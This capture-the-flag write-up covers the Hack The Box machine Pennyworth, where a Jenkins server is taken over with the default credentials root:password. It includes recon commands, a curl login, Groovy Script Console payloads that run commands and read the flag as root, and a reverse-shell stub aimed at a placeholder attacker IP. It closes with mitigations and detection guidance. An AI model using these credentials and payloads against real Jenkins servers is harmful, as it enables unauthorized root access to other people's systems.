---
machine: Pennyworth
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [jenkins, default-credentials, groovy, rce, tier1]
---

# Pennyworth — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

**Jenkins 2.289.1** on **8080/tcp** with default credentials `root:password`. The **Script Console** runs unrestricted Groovy and the process runs as **root**: one line of Groovy gives a shell and the flag is at `/root/flag.txt`.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
```

- One service: Jenkins on Jetty.
- No SSH. The web app is the entire target.

```bash
curl -s -I http://<TARGET_IP>:8080/
```

```text
X-Jenkins: 2.289.1
```

The `X-Jenkins` header confirms the exact version: 2.289.1 (2021, missing later fixes).

## Enumeration

- `/login` is the sign-in form.
- `/script` is the Script Console, reachable only with an admin session.
- `/asynchPeople/` and `/securityRealm/` confirm security is on with the internal database.
- No public signup: authentication is the only way in.

Try default credentials:

```text
username: root
password: password
```

```bash
curl -s -c cookies.txt -X POST http://<TARGET_IP>:8080/j_spring_security_check \
  -d "j_username=root&j_password=<PASSWORD>&from=/"
```

```text
302 → /   (valid session)
```

## Foothold

With an admin session, the Script Console runs Groovy inside the controller JVM, which runs as `root`:

```groovy
def p = ['/bin/bash','-c','id'].execute()
println p.text
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Equivalent reverse shell:

```groovy
String host = "<ATTACKER_IP>"
int port = 4444
String cmd = "/bin/bash"
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
// wire the process streams to the socket and pump data
```

Or read the flag directly:

```groovy
println ['/bin/bash','-c','cat /root/flag.txt'].execute().text
```

## Lateral movement

- Not applicable: Jenkins is the only service and the process is already root.
- With extra nodes (*agents*), the Script Console would execute on them too.

## Privilege escalation

- Not applicable: no escalation, the service starts as root.
- The real flaw is **default credentials + exposed script console**.

## Evidence

- `X-Jenkins: 2.289.1` header.
- `id` output as root and the flag redacted.

## Lessons learned

- `X-Jenkins` gives the version without authentication.
- Jenkins with default credentials is remote code execution by design: the Script Console is not an extra, it is a shell.
- A CI/CD service usually holds deployment credentials: in a real network that would be the next target.
- Running Jenkins as root turns a panel into full host compromise.

## Mitigations and detection

**How to fix it:**

- Change the initial credentials and require MFA/SSO.
- Restrict `/script` and `/manage` to named administrators; disable the console if unused.
- Run Jenkins as an unprivileged user in an isolated container.
- Update to a supported version and limit exposure to the VPN.

**How it would be detected:**

- Successful `root` logins from external IPs.
- Requests to `/script` or `/scriptText` carrying Groovy.
- `bash`/`sh` processes spawned by the Jenkins Java process.

- CWE-1392: Use of Default Credentials
- CWE-94: Improper Control of Generation of Code
- MITRE ATT&CK: [T1078.001](https://attack.mitre.org/techniques/T1078/001/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/)

## References

- [Jenkins — Securing Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)
- [Jenkins — Script Console](https://www.jenkins.io/doc/book/managing/script-console/)
